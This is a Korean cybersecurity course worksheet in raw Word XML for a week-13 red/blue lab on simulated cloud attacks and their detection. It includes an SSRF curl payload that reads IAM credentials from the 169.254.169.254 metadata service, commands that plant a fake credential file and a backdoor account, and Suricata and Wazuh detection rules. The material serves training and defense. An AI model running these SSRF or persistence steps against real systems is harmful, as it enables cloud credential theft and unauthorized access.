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[공격고급 W13] 클라우드 공격 — 메타데이터·자격증명 탈취(시뮬) vs CSPM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attack-adv  ·  난이도 hard  ·  유형 1v1  ·  제한 50분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 xml:space="preserve">공격 고급과정 13주차 — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>클라우드 공격</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>. SSRF 메타데이터 탈취·S3 오설정·IAM 권한상승·서버리스/K8s 공격·</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">자격증명 유출을 다룬다. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>el34 에는 실제 클라우드가 없으므로</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>, SSRF 메타데이터 접근과 자격증명 유출을 el34</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>표면에서 시뮬레이션하고 클라우드 방어(CSPM/CloudTrail/Zero Trust)는 개념으로 학습한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>▸ 이야기</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">공격자가 SSRF 로 클라우드 메타데이터(169.254.169.254)에서 임시 자격증명 탈취를 시도하고(태그 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>aa13r1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>),</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>유출된 클라우드 키 산출물(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>`/tmp/.aa13creds`</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">)과 계정 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>atka13</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 을 남긴다. 방어자는 메타데이터 접근을 탐지하고</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>클라우드 보안 자세를 평가한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>▸ 모드</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• solo : 한 학생이 클라우드 공격(자기 인프라 표적)과 방어를 모두. 대상 = 본인 인프라.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• duel : Red 가 상대(Blue) 인프라를 공격, Blue 는 자기 인프라에서 탐지.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>▸ 공격자 위치(중요)</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">이 주차의 Red 미션은 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>망 외부 공격자 VM(192.168.0.202)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 기준이다. el34 는 공격자의 출처 IP를</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>fw→ips→web(WAF) 전 계층에 그대로 보존하므로(HAProxy 제거·NAT 출처소실 없음), Red 채점은 **대상</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>(el34) 인프라에 남은 탐지 흔적</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">(WAF audit / IPS / 호스트 계정·포트)과 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>출처 IP(192.168.0.202)·</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>고유 태그 상관</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">으로 한다. 반드시 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>고유 태그**를 붙여 앰비언트 노이즈와 구분되게 한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>▸ 이번 주차 전용 마커</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">SSRF 메타데이터 태그 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>`aa13r1-&lt;본인id&gt;`</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">, 유출 키 산출물 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>`/tmp/.aa13creds`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aa13</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>),</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">계정 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>`atka13`</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">, Suricata 탐지 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>sid 9713011</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">, Wazuh 탐지 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>id 103131</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>. 종료 시 cleanup.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22점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[SSRF 메타데이터] — 클라우드 임시 자격증명 탈취 시도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클라우드의 고전 공격은 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>SSRF → 메타데이터 서비스(169.254.169.254) → 임시 자격증명 탈취</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>다(IMDSv1).</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">너는 태그 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>aa13r1-&lt;본인id&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 로 메타데이터 접근을 시도한다.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 (외부 공격자 VM 192.168.0.202)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>예시(id=kim):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>curl -s -H "Host: admin.6v6.lab" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "http://192.168.0.161/files/read?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/aa13r1-kim"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대상 WAF audit(modsec)에 태그 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>aa13r1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 가 포함된 메타데이터 접근 시도가 남았는지로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 xml:space="preserve">대상 WAF audit 에 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>aa13r1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 태그가 포함된 흔적이 남는다.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18점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[자격증명 유출] — 클라우드 키 산출물 + 계정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탈취/유출된 클라우드 자격증명을 산출물 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>`/tmp/.aa13creds`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aa13</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>, AKIA 형식 키 흉내)로 남기고,</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">계정 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>`atka13`</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 으로 지속 접근을 둔다.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printf 'aa13 AKIAEXAMPLE1234 / secret=cloudsecretkey / role=admin' &gt; /tmp/.aa13creds</w:t>
        <w:br/>
        <w:t>sudo useradd -m -s /bin/bash atka13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대상 호스트에 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/tmp/.aa13creds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aa13</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">)이 있거나 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/etc/passwd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 에 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>atka13</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 이 있는지로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/tmp/.aa13creds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aa13</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">) 또는 계정 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>atka13</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>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20점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[메타데이터 접근 탐지] — Suricata 룰 (sid 9713011)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SSRF 메타데이터 접근(169.254.169.254)을 잡는 Suricata 룰(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>sid 9713011</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>)을 만든다.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alert http any any -&gt; any any (msg:"ATKADV-W13 cloud metadata SSRF 169.254.169.254"; flow:to_server; http.uri; content:"169.254.169.254"; nocase; sid:9713011; rev:1;)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo suricatasc -c reload-rules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ips 의 </w:t>
      </w:r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 xml:space="preserve"> 에 sid 9713011 룰이 있는지로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 xml:space="preserve"> 에 메타데이터 접근을 보는 sid 9713011 룰이 존재한다.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22점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[자격증명 유출 탐지] — Wazuh 룰 (id 103131)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RED-2 의 클라우드 키 유출·계정 생성을 잡는 Wazuh 룰(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>id 103131</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>)을 만든다(개념: 키 패턴 AKIA 탐지).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&lt;group name="edu,cloud,"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;rule id="103131" level="13"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;if_group&gt;edu&lt;/if_group&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;match&gt;atka13&lt;/match&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;description&gt;ATKADV-W13 - cloud credential leak / new account&lt;/description&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;/rule&gt;</w:t>
        <w:br/>
        <w:t>&lt;/group&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo /var/ossec/bin/wazuh-control restart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 에 id 103131 룰이 있는지로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 에 자격증명 유출을 보는 id 103131 룰이 존재한다.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18점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[CSPM·CloudTrail·Zero Trust] — 클라우드 방어 종합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클라우드 보안 자세를 종합한다. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>CSPM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">(ScoutSuite/Prowler 개념), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>CloudTrail</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 이상 탐지 쿼리, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>IaC 보안</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">(Terraform 오설정), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Zero Trust</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 적용, 그리고 클라우드 공격 평가 보고서를 정리한다.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보고서에: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CSPM 점검 항목(S3 공개/과도한 IAM) + CloudTrail 이상 탐지 쿼리 개념 + IaC 보안 + Zero Trust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유출 키(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/tmp/.aa13creds</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>)·계정(atka13) 헌팅</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo tail -200 /var/ossec/logs/alerts/alerts.json | \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  python3 -c 'import sys,json;[print(json.loads(l).get("rule",{}).get("id")) for l in sys.stdin if l.strip()]' | sort | uniq -c | sort -rn | head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본인 SIEM 에 최근 경보가 수집돼 있는지 + 제출한 CSPM/CloudTrail/Zero Trust 분석으로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본인 SIEM 에 최근 경보가 있다(+ CSPM·CloudTrail·Zero Trust·헌팅은 제출로 검증).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